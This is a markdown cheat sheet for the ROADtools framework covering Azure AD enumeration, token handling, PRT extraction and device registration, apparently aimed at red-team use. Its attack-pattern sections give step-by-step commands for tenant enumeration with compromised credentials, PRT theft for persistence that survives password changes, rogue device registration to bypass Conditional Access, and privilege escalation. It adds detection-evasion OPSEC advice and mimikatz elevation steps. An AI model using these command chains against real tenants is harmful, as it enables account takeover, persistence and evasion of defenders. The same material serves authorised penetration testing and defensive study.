# ROADtools

**Type:** Python Framework (ROADrecon + roadtx + ROADlib)
**Purpose:** Rogue Office 365 and Azure Active Directory tools - recon, token manipulation, PRT operations
**Platform:** Windows, Linux, macOS
**Tags:** #azure #azuread #python #enumeration #tokens #prt #device-registration #recon #database

---

## Installation & Setup

```bash
# Install stable versions from PyPi
pip install roadrecon
pip install roadtx

# Or install from GitHub for latest
git clone https://github.com/dirkjanm/ROADtools.git
pip install roadlib/
pip install roadrecon/
pip install roadtx/

# Verify installation
roadrecon --help
roadtx --help
```

**Requirements:**
- Python 3.9+ for ROADrecon
- Python 3.7+ for roadtx

---

## ROADrecon Quick Reference

```bash
# Authenticate and gather data
roadrecon auth -u user@company.com -p password
roadrecon gather

# Start web GUI
roadrecon gui

# Export data
roadrecon dump
roadrecon plugin policies
```

---

## roadtx Quick Reference

```bash
# Get access token
roadtx gettokens -u user@company.com -p password

# Describe current token
roadtx describe

# Get PRT from registry (Windows, admin)
roadtx getprt

# Register device
roadtx device -a register

# Get token using PRT
roadtx prt -r roadtx.prt
```

---

## ROADrecon: Data Gathering & Recon

### AUTH: Authentication Methods

**Use Case:** Authenticate to Azure AD for data collection

```bash
# Username and password
roadrecon auth -u user@company.com -p 'P@ssw0rd!'

# Access token
roadrecon auth -t <access-token>

# Refresh token
roadrecon auth --refresh-token <refresh-token>

# Refresh token from file
roadrecon auth --tokens-from-file tokens.json

# Authenticate and save tokens
roadrecon auth -u user@company.com -p password --tokens-stdout > tokens.json
```

### ENUM: Gather Azure AD Data

**Use Case:** Collect all Azure AD information to local database

```bash
# Full data gathering
roadrecon gather

# Gather with authentication
roadrecon auth -u user@company.com -p password
roadrecon gather

# Specify output database
roadrecon gather -d /path/to/database.db

# Gather specific data only
roadrecon gather --mfa-only
roadrecon gather --service-principals-only
```

### ENUM: Interactive Web GUI

**Use Case:** Browse collected data with web interface

```bash
# Start GUI (default port 5000)
roadrecon gui

# Custom port
roadrecon gui -p 8080

# Specify database
roadrecon gui -d /path/to/database.db

# Access at http://localhost:5000
```

**GUI Features:**
- User enumeration and analysis
- Group membership visualization
- Service principal permissions
- Directory role assignments
- Conditional Access policies
- MFA status
- Device information
- Application consents

### ENUM: Export Data (Plugins)

**Use Case:** Export specific data types from database

```bash
# List available plugins
roadrecon plugin -h

# Export all users to CSV
roadrecon plugin users -o users.csv

# Export groups
roadrecon plugin groups -o groups.csv

# Export service principals
roadrecon plugin servicePrincipals -o sps.csv

# Export directory roles
roadrecon plugin directoryRoles -o roles.csv

# Export devices
roadrecon plugin devices -o devices.csv

# Export Conditional Access policies
roadrecon plugin policies -o ca-policies.json

# Export OAuth permissions
roadrecon plugin oauth2PermissionGrants -o oauth-permissions.csv

# Dump all data
roadrecon dump
```

### ENUM: Custom Queries

**Use Case:** Query the SQLite database directly

```bash
# Database location (default)
# ~/.roadtools/roadrecon.db

# Query with sqlite3
sqlite3 ~/.roadtools/roadrecon.db

# Example queries:
SELECT * FROM users WHERE accountEnabled = 1;
SELECT * FROM servicePrincipals;
SELECT * FROM directoryRoles;
SELECT * FROM oauth2PermissionGrants;
```

---

## roadtx: Token Operations

### CRED: Get Access Tokens

**Use Case:** Obtain Azure AD access tokens via various methods

```bash
# Username and password
roadtx gettokens -u user@company.com -p 'P@ssw0rd!'

# With MFA (device code flow)
roadtx gettokens -u user@company.com -p password --device-code

# Specify client and resource
roadtx gettokens -u user@company.com -p password -c 1950a258-227b-4e31-a9cf-717495945fc2 -r https://graph.microsoft.com

# Browser-based authentication
roadtx gettokens --browser

# Windows Integrated Auth (on domain-joined Windows)
roadtx gettokens --windows-hello

# Certificate-based authentication
roadtx gettokens --pem-cert cert.pem --cert-thumbprint <thumbprint> --client-id <client-id> --tenant <tenant-id>

# Using refresh token
roadtx refreshtoken -r <refresh-token>

# Save tokens to file
roadtx gettokens -u user@company.com -p password -t tokens.json
```

### CRED: Token Analysis

**Use Case:** Inspect and decode tokens

```bash
# Describe current cached token
roadtx describe

# Describe token from file
roadtx describe -t tokens.json

# Decode specific token
roadtx describe --jwt <jwt-token>

# Shows:
# - Token issuer
# - Subject (user/app)
# - Claims
# - Expiration time
# - Scopes/roles
```

### CRED: PRT Operations (Windows)

**Use Case:** Extract and use Primary Refresh Token

```bash
# Get PRT from Windows registry (requires admin/SYSTEM)
roadtx getprt

# Get PRT and session key
roadtx getprt --key-pem session.key

# Save PRT to file
roadtx getprt -o roadtx.prt

# Use PRT to get tokens
roadtx prt -r roadtx.prt -c 1950a258-227b-4e31-a9cf-717495945fc2

# Request token for specific resource using PRT
roadtx prt -r roadtx.prt --resource https://graph.microsoft.com

# Get token using PRT with session key
roadtx prt -r roadtx.prt -k session.key
```

### PERSIST: Device Registration

**Use Case:** Register rogue device to Azure AD

```bash
# Register device
roadtx device -a register -n DESKTOP-ATTACKER

# Register and save certificate
roadtx device -a register -n FAKE-DEVICE --cert-pem device.pem --key-pem device-key.pem

# Register with specific tenant
roadtx device -a register -n DEVICE01 --tenant company.onmicrosoft.com

# List registered devices (from current user context)
roadtx device -a list

# Delete device registration
roadtx device -a delete --device-id <device-id>
```

### PERSIST: PRT Cookie Generation

**Use Case:** Generate browser cookies from PRT

```bash
# Get PRT cookie for web access
roadtx prtcookie -r roadtx.prt

# Generate cookie for specific site
roadtx prtcookie -r roadtx.prt --url https://portal.azure.com

# Use session key with PRT
roadtx prtcookie -r roadtx.prt -k session.key
```

### EXEC: Use Tokens with Tools

**Use Case:** Export tokens for use with other tools

```bash
# Get tokens and save
roadtx gettokens -u user@company.com -p password -t tokens.json

# Tokens saved in JSON format containing:
# - access_token
# - refresh_token
# - id_token
# - expires_in

# Use with AADInternals
# $token = (Get-Content tokens.json | ConvertFrom-Json).access_token

# Use with az CLI
# az account get-access-token

# Use with PowerZure, etc.
```

---

## Attack Patterns

### Pattern: Compromised User → Full Tenant Enumeration
```bash
# 1. Authenticate with credentials
roadrecon auth -u compromised@company.com -p 'password'

# 2. Gather all tenant data
roadrecon gather

# 3. Start GUI and analyze
roadrecon gui

# 4. In GUI, explore:
# - High-privilege users
# - Service principals with high permissions
# - Conditional Access policy gaps
# - Applications with admin consent
# - Devices without compliance
```

### Pattern: Token Theft → PRT Extraction → Persistence
```bash
# 1. Get initial access token
roadtx gettokens -u user@company.com -p password -t initial-tokens.json

# 2. If you get access to Windows machine (admin):
roadtx getprt -o roadtx.prt --key-pem session.key

# 3. PRT valid for 90 days, survives password changes

# 4. Use PRT to get fresh tokens anytime
roadtx prt -r roadtx.prt -k session.key -c <client-id> --resource https://graph.microsoft.com

# 5. Register fake device for persistence
roadtx device -a register -n LEGITIMATE-LAPTOP --cert-pem device.pem
```

### Pattern: Service Principal Analysis
```bash
# 1. Collect tenant data
roadrecon auth -u user@company.com -p password
roadrecon gather

# 2. Export service principals
roadrecon plugin servicePrincipals -o sps.csv

# 3. Query for high-permission SPs
sqlite3 ~/.roadtools/roadrecon.db
SELECT * FROM oauth2PermissionGrants WHERE scope LIKE '%AppRoleAssignment%';

# 4. Identify SPs with secrets you can access
# 5. Use those SPs for privilege escalation
```

### Pattern: Conditional Access Bypass via Device Registration
```bash
# 1. Analyze CA policies
roadrecon gather
roadrecon plugin policies -o ca-policies.json

# 2. If CA requires "compliant device"
roadtx device -a register -n CORP-LAPTOP-001

# 3. Device registration may satisfy "hybrid joined" requirement
# 4. Use device certificate to authenticate
roadtx gettokens --cert-pem device.pem --cert-key device-key.pem
```

---

## ROADrecon Database Schema

### Key Tables

**users**
- objectId, userPrincipalName, displayName, accountEnabled
- mfaDetail (MFA status)
- assignedRoles, memberOf

**servicePrincipals**
- appId, displayName, objectId
- appRoles, oauth2Permissions
- passwordCredentials, keyCredentials

**directoryRoles**
- roleTemplateId, displayName
- members (via link table)

**groups**
- objectId, displayName, mailEnabled, securityEnabled
- members

**oauth2PermissionGrants**
- clientId (service principal)
- resourceId (resource being accessed)
- scope (delegated permissions)

**devices**
- deviceId, displayName, deviceOSType
- isCompliant, isManaged
- registeredOwners

---

## Token Types & Client IDs

### Common Client IDs
```bash
# Azure PowerShell
1950a258-227b-4e31-a9cf-717495945fc2

# Microsoft Graph PowerShell
14d82eec-204b-4c2f-b7e8-296a70dab67e

# Azure CLI
04b07795-8ddb-461a-bbee-02f9e1bf7b46

# Microsoft Office
d3590ed6-52b3-4102-aeff-aad2292ab01c

# Microsoft Teams
1fec8e78-bce4-4aaf-ab1b-5451cc387264

# Outlook
00000002-0000-0ff1-ce00-000000000000

# Use specific client ID
roadtx gettokens -u user@company.com -p password -c 1950a258-227b-4e31-a9cf-717495945fc2
```

### Common Resources
```bash
# Microsoft Graph
https://graph.microsoft.com

# Azure Management
https://management.azure.com

# Azure AD Graph (legacy)
https://graph.windows.net

# Office 365 Management
https://manage.office.com

# Specify resource
roadtx gettokens -u user@company.com -p password -r https://graph.microsoft.com
```

---

## Pro Tips

💡 **Database Reuse**: ROADrecon stores data in SQLite - can be shared with team
💡 **PRT is Gold**: PRT survives password changes, valid for 90 days
💡 **Device Registration**: Bypasses some Conditional Access policies
💡 **Async Gathering**: ROADrecon uses async calls for fast data collection
💡 **GUI is Powerful**: Web interface makes analysis much easier than raw database
💡 **Token Refresh**: Refresh tokens can last months to years
💡 **Custom Queries**: Direct SQLite queries give most flexibility
💡 **Combine with AADInternals**: Use ROADrecon for recon, AADInternals for exploitation
💡 **Session Keys**: PRT session key enables nonce validation bypass
💡 **Certificate Auth**: Device certificates harder to detect than passwords

---

## OPSEC Considerations

⚠️ **High Risk:**
- Device registration (logged in Azure AD, may alert SOC)
- Extensive data gathering (many Graph API calls)
- PRT extraction (requires admin/SYSTEM on Windows)

⚠️ **Medium Risk:**
- Using stolen PRT (generates authentication logs)
- Large-scale enumeration queries
- Exporting all tenant data

✅ **Lower Risk:**
- Standard token requests (matches normal user behavior)
- Reading data via Graph API (if within user's normal activity)
- Using refresh tokens (less suspicious than repeated password auth)

**Detection Vectors:**
- Azure AD sign-in logs
- Device registration events
- Unusual Graph API query patterns
- Token requests from unexpected client IDs
- PRT-based authentication from new locations

---

## Key Commands Reference

**ROADrecon:**
- Authentication: `roadrecon auth`
- Data gathering: `roadrecon gather`
- Web GUI: `roadrecon gui`
- Export plugins: `roadrecon plugin`
- Dump all: `roadrecon dump`

**roadtx:**
- Get tokens: `roadtx gettokens`
- Refresh: `roadtx refreshtoken`
- Describe: `roadtx describe`
- PRT extraction: `roadtx getprt`
- PRT usage: `roadtx prt`
- PRT cookies: `roadtx prtcookie`
- Device ops: `roadtx device`

---

## ROADrecon GUI Features

When you run `roadrecon gui`, you get a web interface with:

**Dashboard:**
- Tenant overview
- User statistics
- MFA status summary
- Device compliance

**Users:**
- List all users
- MFA status
- Assigned roles
- Group memberships
- Sign-in activity

**Groups:**
- All groups
- Members
- Owners
- Dynamic membership rules

**Service Principals:**
- Applications
- App permissions
- OAuth grants
- Owners

**Directory Roles:**
- All roles
- Members
- Role assignments

**Devices:**
- Registered/joined devices
- Compliance status
- Owners

**Policies:**
- Conditional Access policies
- Policy conditions and controls

---

## Troubleshooting

### Authentication Errors
```bash
# Check token validity
roadtx describe -t tokens.json

# Get fresh token
roadtx refreshtoken -r <refresh-token>

# Clear cached tokens
rm ~/.roadtools_auth
```

### PRT Extraction Issues
```bash
# Requires admin/SYSTEM privileges
# Run as SYSTEM:
psexec -s -i cmd.exe
roadtx getprt

# Or use mimikatz:
privilege::debug
token::elevate
roadtx getprt
```

### Database Issues
```bash
# Specify custom database location
roadrecon gather -d /path/to/custom.db
roadrecon gui -d /path/to/custom.db

# Reset database (delete and re-gather)
rm ~/.roadtools/roadrecon.db
roadrecon gather
```

---

## Resources

- GitHub: https://github.com/dirkjanm/ROADtools
- Wiki: https://github.com/dirkjanm/ROADtools/wiki
- roadtx Wiki: https://github.com/dirkjanm/ROADtools/wiki/ROADtools-Token-eXchange-(roadtx)
- ROADrecon Intro: https://dirkjanm.io/introducing-roadtools-token-exchange-roadtx/
- Blog: https://dirkjanm.io
- Author: @_dirkjan (Dirk-jan Mollema)
